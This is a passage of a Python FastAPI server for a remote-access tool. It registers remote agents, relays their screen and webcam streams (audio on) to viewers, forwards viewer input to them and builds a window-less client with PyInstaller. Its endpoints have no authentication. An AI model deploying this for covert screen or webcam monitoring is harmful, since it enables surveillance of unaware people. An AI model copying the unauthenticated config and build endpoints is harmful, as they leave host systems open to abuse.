                        "last_seen": time.time(),
                    }
                    udp_info = f" (UDP:{STREAM_PORT or 'auto'})" if STREAM_PORT != 0 else ""
                    logger.info(f"✅ Node registered: {data['data'].get('hostname', '?')} ({device_id[:8]}...){udp_info}")
                elif device_id:
                    session = await state.get_client(device_id)
                    if session:
                        session.last_seen = time.time()
                        await session.broadcast_text(data)
    except WebSocketDisconnect:
        pass
    except Exception as ex:
        logger.warning(f"Agent loop error ({device_id[:8] if device_id else '?'}): {ex}")
    finally:
        logger.info(f"❌ Node disconnected: {device_id[:8] if device_id else '?'}...")
        if device_id:
            if device_id in known_clients:
                known_clients[device_id]["status"] = "offline"
                known_clients[device_id]["last_seen"] = time.time()
            await state.remove_client(device_id)


@app.websocket("/ws/client_cam")
async def ws_client_cam(websocket: WebSocket):
    await websocket.accept()
    logger.info("⚡ Agent camera stream attempt...")
    device_id = None
    try:
        while True:
            raw = await websocket.receive()
            parsed = _ws_payload(raw)
            if parsed is None:
                break
            kind, payload = parsed
            if kind == "skip":
                continue
            if kind == "bytes":
                if device_id:
                    session = await state.get_client(device_id)
                    if session:
                        session.last_seen = time.time()
                        await session.broadcast_cam_bytes(payload)
            elif kind == "text":
                data = json.loads(payload)
                if data.get("cmd") == CMD_REG:
                    device_id = data["data"]["id"]
                    session = await state.get_client(device_id)
                    if session:
                        session.camera_ws = websocket
                        logger.info(f"✅ Camera stream registered: {device_id[:8]}...")
                    else:
                        logger.warning(f"Camera stream arrived before control connection: {device_id[:8]}...")
    except WebSocketDisconnect:
        pass
    except Exception as ex:
        logger.warning(f"Camera loop error ({device_id[:8] if device_id else '?'}): {ex}")
    finally:
        logger.info(f"❌ Camera stream disconnected: {device_id[:8] if device_id else '?'}...")
        if device_id:
            session = await state.get_client(device_id)
            if session and session.camera_ws is websocket:
                session.camera_ws = None


@app.websocket("/ws/viewer/{device_id}")
async def ws_viewer(websocket: WebSocket, device_id: str):
    await websocket.accept()
    session = await state.get_client(device_id)
    if not session:
        await websocket.close(code=4001, reason="No such client")
        return
    if len(session.viewers) >= 10:
        logger.warning(f"Viewer limit reached for {device_id[:8]}...")
        await websocket.close(code=4002, reason="Max viewers reached")
        return
    session.viewers.add(websocket)
    logger.info(f"👁 Viewer attached to {device_id[:8]}... (total: {len(session.viewers)})")
    try:
        while True:
            raw = await websocket.receive()
            parsed = _ws_payload(raw)
            if parsed is None:
                break
            kind, payload = parsed
            if kind == "skip":
                continue
            session = await state.get_client(device_id)
            if not session:
                break
            try:
                if kind == "bytes":
                    await session.agent_send_bytes(payload)
                elif kind == "text":
                    await session.agent_send_text(payload)
            except Exception:
                break
    except WebSocketDisconnect:
        pass
    except Exception as ex:
        logger.warning(f"Viewer error ({device_id[:8]}...): {ex}")
    finally:
        session = await state.get_client(device_id)
        if session:
            session.viewers.discard(websocket)
            if not session.viewers and not session.cam_viewers:
                try:
                    await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"mode": "none"}}))
                except Exception:
                    pass


@app.websocket("/ws/viewer_cam/{device_id}")
async def ws_viewer_cam(websocket: WebSocket, device_id: str):
    await websocket.accept()
    session = await state.get_client(device_id)
    if not session:
        await websocket.close(code=4001, reason="No such client")
        return
    if len(session.cam_viewers) >= 5:
        logger.warning(f"Cam viewer limit reached for {device_id[:8]}...")
        await websocket.close(code=4002, reason="Max cam viewers reached")
        return
    session.cam_viewers.add(websocket)
    logger.info(f"👁 Webcam viewer attached to {device_id[:8]}... (total: {len(session.cam_viewers)})")
    try:
        if session.ws:
            try:
                await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"substream": "cam", "enabled": True, "audio": True}}))
            except Exception:
                pass
        while True:
            raw = await websocket.receive()
            parsed = _ws_payload(raw)
            if parsed is None:
                break
            session = await state.get_client(device_id)
            if not session:
                break
            kind, payload = parsed
            if kind == "skip":
                continue
            try:
                if kind == "bytes":
                    await session.agent_send_bytes(payload)
                elif kind == "text":
                    await session.agent_send_text(payload)
            except Exception:
                break
    except WebSocketDisconnect:
        pass
    except Exception as ex:
        logger.warning(f"Cam viewer error ({device_id[:8]}...): {ex}")
    finally:
        session = await state.get_client(device_id)
        if session:
            session.cam_viewers.discard(websocket)
            if not session.cam_viewers and session.ws:
                try:
                    await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"substream": "cam", "enabled": False}}))
                except Exception:
                    pass


@app.get("/")
async def root():
    try:
        with open("dashboard_working.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except FileNotFoundError:
        return HTMLResponse(content=DASHBOARD)


@app.get("/clients")
async def get_clients():
    return {cid: s.info for cid, s in state.clients.items()}


@app.get("/known_clients")
async def get_known_clients():
    result = {}
    for cid, info in known_clients.items():
        result[cid] = dict(info)
        session = state.clients.get(cid)
        if session:
            result[cid]["info"] = session.info
    return result


@app.get("/stats")
async def get_stats():
    clients = state.clients
    total_viewers = sum(len(s.viewers) + len(s.cam_viewers) for s in clients.values())
    return {
        "active_clients": len(clients),
        "total_viewers": total_viewers,
        "uptime": time.time() - _start_time if '_start_time' in dir() else 0,
        "clients": {
            cid: {
                "hostname": s.info.get("hostname", "?"),
                "os": s.info.get("os", "?")[:40],
                "connected_for": int(time.time() - s.created),
                "viewers": len(s.viewers),
                "cam_viewers": len(s.cam_viewers),
            }
            for cid, s in clients.items()
        },
    }


def _load_network_config():
    cfg_path = os.path.join(os.getcwd(), "network_config.json")
    if os.path.exists(cfg_path):
        try:
            with open(cfg_path, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return {
        "server_bind_host": os.environ.get("HOST", "127.0.0.1"),
        "server_port": int(os.environ.get("PORT", "8080")),
        "client_target_host": "127.0.0.1",
        "client_target_port": 8080
    }


def _save_network_config(data):
    cfg_path = os.path.join(os.getcwd(), "network_config.json")
    with open(cfg_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


@app.get("/network_config")
async def get_network_config():
    return _load_network_config()


@app.post("/network_config")
async def post_network_config(request: Request):
    data = await request.json()
    try:
        _save_network_config(data)
        return JSONResponse({"status": "ok"})
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=500)


@app.post("/build_client")
async def build_client():
    pyinstaller = shutil.which("pyinstaller")
    if not pyinstaller:
        return JSONResponse({"status": "error", "message": "pyinstaller not found"}, status_code=500)
    try:
        proc = subprocess.run([pyinstaller, "--onefile", "--noconsole", "client.py"], capture_output=True, text=True, timeout=300)
        out = proc.stdout + "\n" + proc.stderr
        return PlainTextResponse(out)
    except Exception as e:
        return PlainTextResponse(str(e), status_code=500)


@app.get("/server_logs")
async def server_logs(lines: int = 100):
    try:
        with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
            return PlainTextResponse("".join(deque(f, maxlen=lines)))
    except FileNotFoundError:
        return PlainTextResponse("Server log file not found.")
    except Exception as e:
        return PlainTextResponse(f"Error reading server logs: {e}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("--gui", "-g", "--dashboard-gui"):
        from dashboard_host import main as _dashboard_main

        raise SystemExit(_dashboard_main(sys.argv[2:]) or 0)
    host = os.environ.get("HOST", "0.0.0.0")
    port = int(os.environ.get("PORT", "80"))
    uvicorn.run(
        app,
        host=host,
        port=port,
        backlog=2048,
        ws_ping_interval=20,
        ws_ping_timeout=90,
        timeout_keep_alive=120,
    )
        
